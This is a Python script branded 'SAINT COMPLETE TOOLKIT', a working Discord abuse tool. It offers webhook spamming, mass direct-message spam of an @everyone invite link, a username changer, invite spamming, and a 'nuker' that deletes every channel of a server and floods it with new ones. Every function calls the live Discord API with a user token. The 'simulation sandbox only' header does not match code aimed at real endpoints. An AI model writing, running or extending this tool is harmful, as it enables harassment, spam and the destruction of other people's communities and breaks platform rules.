#!/usr/bin/env python3
# SAINT COMPLETE TOOLKIT - SIMULATION SANDBOX ONLY
# SYSTEM LOCKCHAIN | OWNER DVA1 | USER HYDRA
# FIXED: DM Spammer uses token + target user ID only

import requests, time, os, sys

os.system('cls' if os.name == 'nt' else 'clear')

print('\033[91m██████╗ ██╗  ██╗███████╗ █████╗ ██╗███╗   ██╗████████╗')
print('\033[93m╚════██╗██║ ██╔╝██╔════╝██╔══██╗██║████╗  ██║╚══██╔══╝')
print('\033[92m █████╔╝█████╔╝ ███████╗███████║██║██╔██╗ ██║   ██║   ')
print('\033[96m██╔═══╝ ██╔═██╗ ╚════██║██╔══██║██║██║╚██╗██║   ██║   ')
print('\033[94m███████╗██║  ██╗███████║██║  ██║██║██║ ╚████║   ██║   ')
print('\033[95m╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝   ╚═╝\033[0m')

print('\033[36m' + r'''
╔══════════════════════════════════════════════════════════════╗
║  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ ║
║ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌║
║ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌║
║ ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌║
║ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌║
║ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌║
║ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌║
║ ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌║
║ ▐░▌       ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌║
║ ▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌║
║  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ ║
║                2KSAINT ANTI BOBO ANTI TANGA                        ║
╚════════════════════════════════════════════════════════════════════╝
''' + '\033[0m')

SPAM_MSG = """@everyone 
https://discord.gg/TnzdGhrVS
"""

print('\033[35m[1] WEBHOOK SPAMMER | [2] MASS DM | [3] NAME CHANGER | [4] INVITER | [5] NUKER\033[0m')
choice = input('\033[33m[SAINT] CHOICE: \033[0m')

if choice == '1':
    url = input('Webhook URL: ')
    count = int(input('Messages (50): ') or 50)
    for i in range(count):
        try:
            r = requests.post(url, json={'content': SPAM_MSG})
            print(f'\033[92m[{i+1}] Sent\033[0m' if r.status_code == 204 else f'\033[91m[{i+1}] Fail\033[0m')
        except:
            print(f'\033[91m[{i+1}] Error\033[0m')
        time.sleep(0.5)

elif choice == '2':
    token = input('User Token: ')
    user_id = input('Target User ID: ')
    count = int(input('Messages to send (10): ') or 10)
    headers = {'Authorization': token}
    for i in range(count):
        try:
            ch = requests.post('https://discord.com/api/v9/users/@me/channels', json={'recipient_id': user_id}, headers=headers)
            if ch.status_code == 200:
                channel_id = ch.json()['id']
                send = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', json={'content': SPAM_MSG}, headers=headers)
                if send.status_code == 200:
                    print(f'\033[92m[{i+1}] DM sent to {user_id}\033[0m')
                else:
                    print(f'\033[91m[{i+1}] Send failed\033[0m')
            else:
                print(f'\033[91m[{i+1}] Cannot create DM channel\033[0m')
        except Exception as e:
            print(f'\033[91m[{i+1}] Error: {e}\033[0m')
        time.sleep(1)

elif choice == '3':
    token = input('User Token: ')
    new_name = input('New name: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    try:
        r = requests.patch('https://discord.com/api/v9/users/@me', json={'username': new_name}, headers=headers)
        print(f'\033[92mChanged to {new_name}\033[0m' if r.status_code == 200 else f'\033[91mFail\033[0m')
    except:
        print(f'\033[91mError\033[0m')

elif choice == '4':
    token = input('User Token: ')
    invite_code = input('Invite code: ')
    user_ids = input('User IDs (comma): ').split(',')
    headers = {'Authorization': token}
    for uid in user_ids:
        uid = uid.strip()
        try:
            ch = requests.post('https://discord.com/api/v9/users/@me/channels', json={'recipient_id': uid}, headers=headers)
            if ch.status_code == 200:
                cid = ch.json()['id']
                requests.post(f'https://discord.com/api/v9/channels/{cid}/messages', json={'content': f'https://discord.gg/{invite_code}'}, headers=headers)
                print(f'\033[92mSent invite to {uid}\033[0m')
            else:
                print(f'\033[91mFailed to DM {uid}\033[0m')
        except:
            print(f'\033[91mError with {uid}\033[0m')
        time.sleep(0.8)

elif choice == '5':
    token = input('User Token: ')
    guild_id = input('Guild ID: ')
    headers = {'Authorization': token}
    print('\033[91m[!] NUKING...\033[0m')
    try:
        channels = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers).json()
        for ch in channels:
            try:
                requests.delete(f'https://discord.com/api/v9/channels/{ch["id"]}', headers=headers)
                print(f'\033[91mDeleted: {ch["name"]}\033[0m')
            except:
                pass
            time.sleep(0.3)
        for i in range(30):
            try:
                requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', json={'name': f'2ksaint-{i}', 'type': 0}, headers=headers)
                print(f'\033[93mCreated: 2ksaint-{i}\033[0m')
            except:
                pass
            time.sleep(0.3)
        print('\033[91m[+] NUKE COMPLETE\033[0m')
    except:
        print('\033[91mNuke error\033[0m')